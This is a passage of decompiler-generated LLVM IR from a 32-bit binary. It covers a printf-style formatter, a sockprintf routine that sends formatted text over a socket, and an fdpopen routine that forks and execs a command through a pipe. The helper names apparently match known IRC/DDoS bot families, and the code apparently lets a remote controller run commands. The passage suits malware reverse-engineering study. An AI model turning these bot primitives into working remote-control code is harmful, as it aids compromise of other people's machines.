dec_label_pc_80485ff:                             ; preds = %dec_label_pc_80485e1
  %v2_8048602 = load i8, i8* %v22_80485e1, align 1
  %v10_8048605 = icmp eq i8 %v2_8048602, 37
  br i1 %v10_8048605, label %dec_label_pc_8048854, label %dec_label_pc_804860d

dec_label_pc_804860d:                             ; preds = %dec_label_pc_80485ff
  %v2_8048610 = load i8, i8* %v22_80485e1, align 1
  %v10_8048613 = icmp eq i8 %v2_8048610, 45
  %v1_8048615 = icmp eq i1 %v10_8048613, false
  br i1 %v1_8048615, label %dec_label_pc_804862a.preheader, label %dec_label_pc_8048617

dec_label_pc_8048617:                             ; preds = %dec_label_pc_804860d
  %v5_8048617 = add i32 %stack_var_8.4.in41, 2
  %v22_8048617 = inttoptr i32 %v5_8048617 to i8*
  br label %dec_label_pc_804862a.preheader

dec_label_pc_804862a.preheader:                   ; preds = %dec_label_pc_8048617, %dec_label_pc_804860d
  %stack_var_8.0.ph = phi i8* [ %v22_80485e1, %dec_label_pc_804860d ], [ %v22_8048617, %dec_label_pc_8048617 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804860d ], [ 1, %dec_label_pc_8048617 ]
  %v4_804862a22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_804862d23 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_804863030 = icmp eq i8 %v2_804862d23, 48
  br i1 %v7_804863030, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048623:                             ; preds = %dec_label_pc_804862a.preheader, %dec_label_pc_8048623
  %v4_804862a33 = phi i32 [ %v5_8048623, %dec_label_pc_8048623 ], [ %v4_804862a22, %dec_label_pc_804862a.preheader ]
  %stack_var_-32.032 = phi i32 [ %v4_8048626, %dec_label_pc_8048623 ], [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ]
  %v5_8048623 = add i32 %v4_804862a33, 1
  %v22_8048623 = inttoptr i32 %v5_8048623 to i8*
  %v4_8048626 = or i32 %stack_var_-32.032, 2
  %v2_804862d = load i8, i8* %v22_8048623, align 1
  %v7_8048630 = icmp eq i8 %v2_804862d, 48
  br i1 %v7_8048630, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048659.preheader:                   ; preds = %dec_label_pc_8048623, %dec_label_pc_804862a.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804862a.preheader ], [ %v22_8048623, %dec_label_pc_8048623 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ], [ %v4_8048626, %dec_label_pc_8048623 ]
  br label %dec_label_pc_8048659

dec_label_pc_8048636:                             ; preds = %dec_label_pc_8048663
  %v2_804863f = mul i32 %stack_var_-36.0, 10
  %v2_8048647 = load i8, i8* %stack_var_8.1, align 1
  %v3_8048647 = zext i8 %v2_8048647 to i32
  %v5_804864d = add i32 %v3_8048647, %v2_804863f
  %v1_8048650 = add i32 %v5_804864d, -48
  %v5_8048656 = add i32 %v4_8048659, 1
  %v22_8048656 = inttoptr i32 %v5_8048656 to i8*
  br label %dec_label_pc_8048659

dec_label_pc_8048659:                             ; preds = %dec_label_pc_8048659.preheader, %dec_label_pc_8048636
  %stack_var_8.1 = phi i8* [ %v22_8048656, %dec_label_pc_8048636 ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048659.preheader ]
  %stack_var_-36.0 = phi i32 [ %v1_8048650, %dec_label_pc_8048636 ], [ 0, %dec_label_pc_8048659.preheader ]
  %v4_8048659 = ptrtoint i8* %stack_var_8.1 to i32
  %v2_804865c = load i8, i8* %stack_var_8.1, align 1
  %tmp = icmp ult i8 %v2_804865c, 48
  br i1 %tmp, label %dec_label_pc_804866d, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_8048659
  %v2_8048666 = load i8, i8* %stack_var_8.1, align 1
  %tmp48 = icmp ult i8 %v2_8048666, 58
  br i1 %tmp48, label %dec_label_pc_8048636, label %dec_label_pc_804866d

dec_label_pc_804866d:                             ; preds = %dec_label_pc_8048663, %dec_label_pc_8048659
  %v2_8048670 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048673 = icmp eq i8 %v2_8048670, 115
  %v1_8048675 = icmp eq i1 %v10_8048673, false
  br i1 %v1_8048675, label %dec_label_pc_80486c4, label %dec_label_pc_8048677

dec_label_pc_8048677:                             ; preds = %dec_label_pc_804866d
  %v1_804867a = add i32 %stack_var_12.142, 4
  %v1_8048682 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048682 = load i32, i32* %v1_8048682, align 4
  %v4_8048687 = icmp eq i32 %v2_8048682, 0
  br i1 %v4_8048687, label %dec_label_pc_804869c, label %dec_label_pc_804868d

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048677
  %v5_8048690 = inttoptr i32 %v2_8048682 to i8*
  br label %dec_label_pc_804869c

dec_label_pc_804869c:                             ; preds = %dec_label_pc_8048677, %dec_label_pc_804868d
  %storemerge = phi i8* [ %v5_8048690, %dec_label_pc_804868d ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80584fb.12, i32 0, i32 0), %dec_label_pc_8048677 ]
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_80486b7 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_80486bc = add i32 %v6_80486b7, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80486c4:                             ; preds = %dec_label_pc_804866d
  %v2_80486c7 = load i8, i8* %stack_var_8.1, align 1
  %v10_80486ca = icmp eq i8 %v2_80486c7, 100
  %v1_80486cc = icmp eq i1 %v10_80486ca, false
  br i1 %v1_80486cc, label %dec_label_pc_8048718, label %dec_label_pc_80486ce

dec_label_pc_80486ce:                             ; preds = %dec_label_pc_80486c4
  %v1_80486d1 = add i32 %stack_var_12.142, 4
  %v1_80486d9 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80486d9 = load i32, i32* %v1_80486d9, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804870b = sext i32 %v2_80486d9 to i64
  %v9_804870b = call i32 @printi(i32 %tmp6, i64 %v8_804870b, i32 10, i32 1, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048710 = add i32 %v9_804870b, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048718:                             ; preds = %dec_label_pc_80486c4
  %v2_804871b = load i8, i8* %stack_var_8.1, align 1
  %v10_804871e = icmp eq i8 %v2_804871b, 120
  %v1_8048720 = icmp eq i1 %v10_804871e, false
  br i1 %v1_8048720, label %dec_label_pc_804876c, label %dec_label_pc_8048722

dec_label_pc_8048722:                             ; preds = %dec_label_pc_8048718
  %v1_8048725 = add i32 %stack_var_12.142, 4
  %v1_804872d = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804872d = load i32, i32* %v1_804872d, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804875f = sext i32 %v2_804872d to i64
  %v9_804875f = call i32 @printi(i32 %tmp6, i64 %v8_804875f, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048764 = add i32 %v9_804875f, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_804876c:                             ; preds = %dec_label_pc_8048718
  %v2_804876f = load i8, i8* %stack_var_8.1, align 1
  %v10_8048772 = icmp eq i8 %v2_804876f, 88
  %v1_8048774 = icmp eq i1 %v10_8048772, false
  br i1 %v1_8048774, label %dec_label_pc_80487c0, label %dec_label_pc_8048776

dec_label_pc_8048776:                             ; preds = %dec_label_pc_804876c
  %v1_8048779 = add i32 %stack_var_12.142, 4
  %v1_8048781 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048781 = load i32, i32* %v1_8048781, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80487b3 = sext i32 %v2_8048781 to i64
  %v9_80487b3 = call i32 @printi(i32 %tmp6, i64 %v8_80487b3, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_80487b8 = add i32 %v9_80487b3, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80487c0:                             ; preds = %dec_label_pc_804876c
  %v2_80487c3 = load i8, i8* %stack_var_8.1, align 1
  %v10_80487c6 = icmp eq i8 %v2_80487c3, 117
  %v1_80487c8 = icmp eq i1 %v10_80487c6, false
  br i1 %v1_80487c8, label %dec_label_pc_8048811, label %dec_label_pc_80487ca

dec_label_pc_80487ca:                             ; preds = %dec_label_pc_80487c0
  %v1_80487cd = add i32 %stack_var_12.142, 4
  %v1_80487d5 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80487d5 = load i32, i32* %v1_80487d5, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_8048807 = sext i32 %v2_80487d5 to i64
  %v9_8048807 = call i32 @printi(i32 %tmp6, i64 %v8_8048807, i32 10, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804880c = add i32 %v9_8048807, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048811:                             ; preds = %dec_label_pc_80487c0
  %v2_8048814 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048817 = icmp eq i8 %v2_8048814, 99
  %v1_8048819 = icmp eq i1 %v10_8048817, false
  br i1 %v1_8048819, label %dec_label_pc_804886f, label %dec_label_pc_804881b

dec_label_pc_804881b:                             ; preds = %dec_label_pc_8048811
  %v1_804881e = add i32 %stack_var_12.142, 4
  %v1_8048826 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048826 = load i32, i32* %v1_8048826, align 4
  store i32 %v2_8048826, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_804884a = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_804884f = add i32 %v6_804884a, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048854:                             ; preds = %dec_label_pc_80485ff, %dec_label_pc_80485d3
  %stack_var_8.2 = phi i8* [ %stack_var_8.444, %dec_label_pc_80485d3 ], [ %v22_80485e1, %dec_label_pc_80485ff ]
  %v2_8048857 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048857 = zext i8 %v2_8048857 to i32
  %v4_8048867 = call i32 @printchar(i32* %arg1, i32 %v3_8048857)
  %v4_804886c = add i32 %stack_var_-28.143, 1
  br label %dec_label_pc_804886f

dec_label_pc_804886f:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_804881b, %dec_label_pc_80487ca, %dec_label_pc_8048776, %dec_label_pc_804869c, %dec_label_pc_8048722, %dec_label_pc_80486ce, %dec_label_pc_8048854
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048854 ], [ %stack_var_8.1, %dec_label_pc_8048811 ], [ %stack_var_8.1, %dec_label_pc_804881b ], [ %stack_var_8.1, %dec_label_pc_80487ca ], [ %stack_var_8.1, %dec_label_pc_8048776 ], [ %stack_var_8.1, %dec_label_pc_8048722 ], [ %stack_var_8.1, %dec_label_pc_80486ce ], [ %stack_var_8.1, %dec_label_pc_804869c ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.142, %dec_label_pc_8048854 ], [ %stack_var_12.142, %dec_label_pc_8048811 ], [ %v1_804881e, %dec_label_pc_804881b ], [ %v1_80487cd, %dec_label_pc_80487ca ], [ %v1_8048779, %dec_label_pc_8048776 ], [ %v1_8048725, %dec_label_pc_8048722 ], [ %v1_80486d1, %dec_label_pc_80486ce ], [ %v1_804867a, %dec_label_pc_804869c ]
  %stack_var_-28.0 = phi i32 [ %v4_804886c, %dec_label_pc_8048854 ], [ %stack_var_-28.143, %dec_label_pc_8048811 ], [ %v5_804884f, %dec_label_pc_804881b ], [ %v5_804880c, %dec_label_pc_80487ca ], [ %v5_80487b8, %dec_label_pc_8048776 ], [ %v5_8048764, %dec_label_pc_8048722 ], [ %v5_8048710, %dec_label_pc_80486ce ], [ %v5_80486bc, %dec_label_pc_804869c ]
  %v4_804886f = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804886f = add i32 %v4_804886f, 1
  %stack_var_8.4 = inttoptr i32 %v5_804886f to i8*
  %v2_8048875 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048878 = icmp eq i8 %v2_8048875, 0
  %v1_804887a = icmp eq i1 %v4_8048878, false
  br i1 %v1_804887a, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_804886f, %dec_label_pc_80485e1, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.143, %dec_label_pc_80485e1 ], [ %stack_var_-28.0, %dec_label_pc_804886f ]
  %v4_8048880 = icmp eq i32* %arg1, null
  br i1 %v4_8048880, label %dec_label_pc_804888e, label %dec_label_pc_8048886

dec_label_pc_8048886:                             ; preds = %dec_label_pc_8048880
  %v2_8048889 = load i32, i32* %arg1, align 4
  %v1_804888b = inttoptr i32 %v2_8048889 to i8*
  store i8 0, i8* %v1_804888b, align 1
  br label %dec_label_pc_804888e

dec_label_pc_804888e:                             ; preds = %dec_label_pc_8048880, %dec_label_pc_8048886
  %v2_8048891 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048891, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804886f, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 1, 0, 12 }
  uselistorder i8* %stack_var_8.1, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 16, 15, 13 }
  uselistorder i32 %v5_8048623, { 1, 0 }
  uselistorder i8* %v22_80485e1, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in41, { 1, 0 }
  uselistorder i32 %stack_var_12.142, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.143, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i64, i32, i32, i32, i32, i32)* @printi, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804888e, { 1, 0 }
  uselistorder label %dec_label_pc_804886f, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_804869c, { 1, 0 }
  uselistorder label %dec_label_pc_8048659, { 1, 0 }
  uselistorder label %dec_label_pc_8048623, { 1, 0 }
  uselistorder label %dec_label_pc_80485d3, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048893 = load i32, i32* @ebp, align 4
  store i32 %v0_8048893, i32* %stack_var_-4, align 4
  %v4_8048893 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048893, i32* @ebp, align 4
  %v4_804889c = ptrtoint i32* %stack_var_8 to i32
  %v4_80488b4 = call i32 @print(i32* null, i32 %arg1, i32 %v4_804889c)
  %v2_80488b9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488b9, i32* @ebp, align 4
  ret i32 %v4_80488b4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488bb = load i32, i32* @ebp, align 4
  store i32 %v0_80488bb, i32* %stack_var_-4, align 4
  %v4_80488bb = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80488bb, i32* @ebp, align 4
  %v4_80488c4 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488db = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80488c4)
  %v2_80488e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488e0, i32* @ebp, align 4
  ret i32 %v4_80488db

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e5 = load i32, i32* @edi, align 4
  store i32 %v0_80488e5, i32* %stack_var_-8, align 4
  %v1_80488f0 = call i32 @malloc(i32 2048)
  store i32 %v1_80488f0, i32* %stack_var_-20, align 4
  %v3_8048911 = inttoptr i32 %v1_80488f0 to i8*
  %v4_8048911 = call i32 @__GI_memset(i8* %v3_8048911, i32 0, i32 2048)
  %v4_804891f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048936 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_804891f)
  %v3_804894c = call i32 @_strlen(i8* %v3_8048911)
  %v6_8048953 = add i32 %v1_80488f0, %v3_804894c
  %v1_8048956 = inttoptr i32 %v6_8048953 to i8*
  store i8 10, i8* %v1_8048956, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_80488f0, i32* @edi, align 4
  %v3_804896a = call i32 @_strlen(i8* %v3_8048911)
  %v4_804898a = call i32 @__libc_send(i32 %arg1, i32 %v1_80488f0, i32 %v3_804896a, i32 16384)
  %v1_8048998 = call i32 @free(i32 %v1_80488f0)
  %v0_80489a0 = load i32, i32* @esp, align 4
  %v5_80489a0 = icmp ugt i32 %v0_80489a0, -53
  store i1 %v5_80489a0, i1* @cf, align 1
  %v2_80489a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80489a3, i32* @edi, align 4
  ret i32 %v4_804898a

; uselistorder directives
  uselistorder i32 %v1_80488f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80489a9 = load i32, i32* @edi, align 4
  store i32 %v0_80489a9, i32* %stack_var_-8, align 4
  %v4_80489ad = ptrtoint i8* %arg2 to i32
  %v2_80489b0 = load i8, i8* %arg2, align 1
  %v10_80489b3 = icmp eq i8 %v2_80489b0, 114
  br i1 %v10_80489b3, label %dec_label_pc_80489c1, label %dec_label_pc_80489b7

dec_label_pc_80489b7:                             ; preds = %entry
  %v2_80489ba = load i8, i8* %arg2, align 1
  %v10_80489bd = icmp eq i8 %v2_80489ba, 119
  %v1_80489bf = icmp eq i1 %v10_80489bd, false
  br i1 %v1_80489bf, label %dec_label_pc_8048b83, label %dec_label_pc_80489c1

dec_label_pc_80489c1:                             ; preds = %dec_label_pc_80489b7, %entry
  %v1_80489c4 = add i32 %v4_80489ad, 1
  %v1_80489c5 = inttoptr i32 %v1_80489c4 to i8*
  %v2_80489c5 = load i8, i8* %v1_80489c5, align 1
  %v4_80489c8 = icmp eq i8 %v2_80489c5, 0
  br i1 %v4_80489c8, label %dec_label_pc_80489d8, label %dec_label_pc_8048b83

dec_label_pc_80489d8:                             ; preds = %dec_label_pc_80489c1
  %v2_80489d8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80489de = call i32 @__GI_pipe(i32 %v2_80489d8)
  %v2_80489e3 = icmp slt i32 %v2_80489de, 0
  %v1_80489e5 = icmp eq i1 %v2_80489e3, false
  br i1 %v1_80489e5, label %dec_label_pc_80489f3, label %dec_label_pc_8048b83

dec_label_pc_80489f3:                             ; preds = %dec_label_pc_80489d8
  %v0_80489f3 = load i8*, i8** @global_var_8060540.13, align 4
  %v2_80489f8 = icmp eq i8* %v0_80489f3, null
  %v1_80489fa = icmp eq i1 %v2_80489f8, false
  br i1 %v1_80489fa, label %bb, label %dec_label_pc_80489fc

dec_label_pc_80489fc:                             ; preds = %dec_label_pc_80489f3
  %v0_80489fc = call i32 @getdtablesize()
  %tmp19 = icmp slt i32 %v0_80489fc, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048a16, label %dec_label_pc_8048b83

dec_label_pc_8048a16:                             ; preds = %dec_label_pc_80489fc
  %v2_8048a19 = mul i32 %v0_80489fc, 4
  %v2_8048a1f = call i32 @malloc(i32 %v2_8048a19)
  %v1_8048a24 = inttoptr i32 %v2_8048a1f to i8*
  store i8* %v1_8048a24, i8** @global_var_8060540.13, align 64
  %v2_8048a2e = icmp eq i32 %v2_8048a1f, 0
  %v1_8048a30 = icmp eq i1 %v2_8048a2e, false
  br i1 %v1_8048a30, label %dec_label_pc_8048a3e, label %dec_label_pc_8048b83

dec_label_pc_8048a3e:                             ; preds = %dec_label_pc_8048a16
  %v1_8048a41 = mul i32 %v0_80489fc, 4
  store i32 %v2_8048a1f, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048a52 = and i32 %v2_8048a1f, -256
  %v5_8048a54 = call i8* @_memset(i8* %v1_8048a24, i32 %v1_8048a52, i32 %v1_8048a41)
  br label %bb

bb:                                               ; preds = %dec_label_pc_80489f3, %dec_label_pc_8048a3e
  %v1_8048a56 = call i32 @__vfork(i32 %tmp11)
  %v13_8048a64 = icmp eq i32 %v1_8048a56, -1
  br i1 %v13_8048a64, label %dec_label_pc_8048a75, label %dec_label_pc_8048a6a

dec_label_pc_8048a6a:                             ; preds = %bb
  %v4_8048a6a = icmp eq i32 %v1_8048a56, 0
  %v2_8048a9a = load i8, i8* %arg2, align 1
  %v10_8048a9d = icmp eq i8 %v2_8048a9a, 114
  %v1_8048a9f = icmp eq i1 %v10_8048a9d, false
  br i1 %v4_8048a6a, label %dec_label_pc_8048a97, label %dec_label_pc_8048b3b

dec_label_pc_8048a75:                             ; preds = %bb
  %v3_8048a75 = load i32, i32* %stack_var_-24, align 4
  %v2_8048a7b = call i32 @__libc_close(i32 %v3_8048a75)
  %v2_8048a86 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b83

dec_label_pc_8048a97:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048ad4, label %dec_label_pc_8048aa1

dec_label_pc_8048aa1:                             ; preds = %dec_label_pc_8048a97
  %v9_8048aa4 = icmp eq i32 %tmp7, 1
  br i1 %v9_8048aa4, label %dec_label_pc_8048ac7, label %dec_label_pc_8048aa9

dec_label_pc_8048aa9:                             ; preds = %dec_label_pc_8048aa1
  %v4_8048ab7 = call i32 @dup2(i32 %tmp7, i32 1)
  %v2_8048ac2 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048ac7

dec_label_pc_8048ac7:                             ; preds = %dec_label_pc_8048aa1, %dec_label_pc_8048aa9
  %v3_8048ac7 = load i32, i32* %stack_var_-24, align 4
  %v2_8048acd = call i32 @__libc_close(i32 %v3_8048ac7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048ad4:                             ; preds = %dec_label_pc_8048a97
  %v3_8048ad4 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ad7 = icmp eq i32 %v3_8048ad4, 0
  br i1 %v1_8048ad7, label %dec_label_pc_8048af9, label %dec_label_pc_8048adb

dec_label_pc_8048adb:                             ; preds = %dec_label_pc_8048ad4
  %v4_8048ae9 = call i32 @dup2(i32 %v3_8048ad4, i32 0)
  %v3_8048aee = load i32, i32* %stack_var_-24, align 4
  %v2_8048af4 = call i32 @__libc_close(i32 %v3_8048aee)
  br label %dec_label_pc_8048af9

dec_label_pc_8048af9:                             ; preds = %dec_label_pc_8048ad4, %dec_label_pc_8048adb
  %v2_8048aff = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048ac7, %dec_label_pc_8048af9
  %v8_8048b2a = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8058505.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_80581bb.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8058502.14 to i32), i32 %arg1, i32 0)
  %v2_8048b36 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048b3b:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048b58, label %dec_label_pc_8048b45

dec_label_pc_8048b45:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b45 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b51 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b58:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b5e = load i32, i32* %stack_var_-24, align 4
  %v2_8048b64 = call i32 @__libc_close(i32 %v3_8048b5e)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b69:                             ; preds = %dec_label_pc_8048b45, %dec_label_pc_8048b58
  %stack_var_-28.0 = phi i32 [ %tmp7, %dec_label_pc_8048b58 ], [ %v3_8048b45, %dec_label_pc_8048b45 ]
  %v2_8048b6c = mul i32 %stack_var_-28.0, 4
  %v0_8048b71 = load i8*, i8** @global_var_8060540.13, align 4
  %v1_8048b71 = ptrtoint i8* %v0_8048b71 to i32
  %v2_8048b76 = add i32 %v1_8048b71, %v2_8048b6c
  %v2_8048b7b = inttoptr i32 %v2_8048b76 to i32*
  store i32 %v1_8048a56, i32* %v2_8048b7b, align 4
  br label %dec_label_pc_8048b83

dec_label_pc_8048b83:                             ; preds = %dec_label_pc_8048a16, %dec_label_pc_80489fc, %dec_label_pc_80489d8, %dec_label_pc_80489b7, %dec_label_pc_80489c1, %dec_label_pc_8048a75, %dec_label_pc_8048b69
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048a75 ], [ %stack_var_-28.0, %dec_label_pc_8048b69 ], [ -1, %dec_label_pc_80489c1 ], [ -1, %dec_label_pc_80489b7 ], [ -1, %dec_label_pc_80489d8 ], [ -1, %dec_label_pc_80489fc ], [ -1, %dec_label_pc_8048a16 ]
  %v2_8048b89 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048b89, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048a56, { 1, 2, 0 }
  uselistorder i32 %v0_80489fc, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048b83, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b69, { 1, 0 }
  uselistorder label %dec_label_pc_8048b04, { 1, 0 }
  uselistorder label %dec_label_pc_8048af9, { 1, 0 }
  uselistorder label %dec_label_pc_8048ac7, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b8c = load i32, i32* @ebp, align 4
  store i32 %v0_8048b8c, i32* %stack_var_-4, align 4
  %v0_8048b95 = load i8*, i8** @global_var_8060540.13, align 4
  %v2_8048b9a = icmp eq i8* %v0_8048b95, null
  br i1 %v2_8048b9a, label %dec_label_pc_8048cf9, label %dec_label_pc_8048b9e

dec_label_pc_8048b9e:                             ; preds = %entry
  %v1_8048b95 = ptrtoint i8* %v0_8048b95 to i32
  %v2_8048ba1 = mul i32 %arg1, 4
  %v2_8048bab = add i32 %v1_8048b95, %v2_8048ba1
  %v1_8048bae = inttoptr i32 %v2_8048bab to i32*
  %v2_8048bae = load i32, i32* %v1_8048bae, align 4
  %v1_8048bb0 = icmp eq i32 %v2_8048bae, 0
  %v1_8048bb2 = icmp eq i1 %v1_8048bb0, false
  br i1 %v1_8048bb2, label %dec_label_pc_8048bc3, label %dec_label_pc_8048cf9

dec_label_pc_8048bc3:                             ; preds = %dec_label_pc_8048b9e
  %v1_8048bc9 = call i32 @__libc_close(i32 %arg1)
  %v2_8048bce = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048bd7 = call i32 @sigemptyset(i32 %v2_8048bce)
  %v2_8048bed = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 2)
  %v2_8048c03 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 3)
  %v2_8048c19 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 1)
  %v4_8048c24 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048c39 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048c39 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048c39, i32 %v4_8048c24)
  %v2_8048c58 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048c3e

